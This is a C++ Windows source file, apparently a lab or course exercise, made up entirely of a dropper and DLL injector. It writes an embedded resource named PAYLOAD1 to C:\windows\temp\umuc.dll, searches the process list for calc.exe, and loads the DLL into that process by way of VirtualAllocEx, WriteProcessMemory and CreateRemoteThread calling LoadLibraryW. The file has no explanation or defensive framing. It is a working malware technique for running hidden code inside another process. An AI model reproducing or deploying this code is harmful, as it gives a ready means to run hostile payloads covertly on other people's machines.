#include "stdafx.h"
#include <Windows.h>
#include <tchar.h>

#include <TlHelp32.h>

int dropDll () 
{
	HRSRC resource_info = FindResource (NULL, L"PAYLOAD1", RT_RCDATA);
	if (!resource_info)
	{
		return -1;
	}

	HGLOBAL resource_handle = LoadResource (NULL, resource_info);
	if (!resource_handle) 
	{
		return -1;
	}

	unsigned long file_size = SizeofResource (NULL, resource_info);

	unsigned char* filePtr = (unsigned char*) LockResource (resource_handle);
	if (!filePtr)
	{
		return -1;
	}

	HANDLE file_handle = CreateFile (L"C:\\windows\\temp\\umuc.dll", FILE_ALL_ACCESS, 0, NULL, CREATE_ALWAYS, 0, NULL);
	if (INVALID_HANDLE_VALUE == file_handle)
	{
		return -1;
	}

	unsigned long numWritten;
	while (file_size--)
	{
		WriteFile (file_handle, filePtr, 1, &numWritten, NULL);
		filePtr++;
	}

	CloseHandle (file_handle);

	return 0;
}

int findCalc ()
{
	int returnValue = -1;
	HANDLE hProcessSnap = NULL;
	PROCESSENTRY32 pe32 = {0};

	hProcessSnap = CreateToolhelp32Snapshot (TH32CS_SNAPPROCESS, 0);
	if (hProcessSnap == (HANDLE) -1)
	{
		return returnValue;
	}

	pe32.dwSize = sizeof (PROCESSENTRY32);

	if (Process32First(hProcessSnap, &pe32))
	{

		do 
		{
			_tprintf (L"Process: %s => %d\n", pe32.szExeFile, pe32.th32ProcessID);
			if (wcsncmp(pe32.szExeFile, L"calc.exe", 10) == 0) 
			{
				_tprintf (L"\tFound calc.exe!\n");
				returnValue = pe32.th32ProcessID;
			}
		}
		while (Process32Next(hProcessSnap, &pe32));

	}

	return returnValue;
}

int injectDll (int calcPid)
{

	_tprintf (L"Injecting DLL\n");

	HANDLE hProcess = OpenProcess (PROCESS_QUERY_INFORMATION | PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_VM_WRITE, FALSE, calcPid);
	if (hProcess == NULL) 
	{
		return -1;
	}

	wchar_t filePath[] = L"c:\\windows\\temp\\umuc.dll";
	int cch = 1 + wcslen (filePath);
	int cb = cch * sizeof (wchar_t);

	PWSTR szRemoteFileName = (PWSTR) VirtualAllocEx (hProcess, NULL, cb, MEM_COMMIT, PAGE_READWRITE);
	if (szRemoteFileName == NULL)
	{
		CloseHandle (hProcess);
		return -1;
	}

	if (!WriteProcessMemory (hProcess, szRemoteFileName, (PVOID) filePath, cb, NULL))
	{
		VirtualFreeEx (hProcess, szRemoteFileName, 0, MEM_RELEASE);
		CloseHandle (hProcess);
		return -1;
	}

	PTHREAD_START_ROUTINE pfnThreadRtn = (PTHREAD_START_ROUTINE) GetProcAddress (GetModuleHandle (_T("Kernel32")), "LoadLibraryW");
	if (pfnThreadRtn == NULL)
	{
		VirtualFreeEx (hProcess, szRemoteFileName, 0, MEM_RELEASE);
		CloseHandle (hProcess);
		return -1;
	}

	HANDLE hThread = CreateRemoteThread (hProcess, NULL, 0, pfnThreadRtn, szRemoteFileName, 0, NULL);

	if (hThread != NULL)
	{
		WaitForSingleObject (hThread, INFINITE);
	}

	VirtualFreeEx (hProcess, szRemoteFileName, 0, MEM_RELEASE);
	CloseHandle(hThread);
	CloseHandle(hProcess);

	_tprintf (L"Finished Injecting DLL\n");


	return 0;
}

int _tmain (int argc, _TCHAR* argv[]) 
{
	dropDll();

	int calcPid = findCalc();

	if (calcPid != -1)
	{
		_tprintf (L"%d\n", injectDll (calcPid));
	}

	return 0;

}

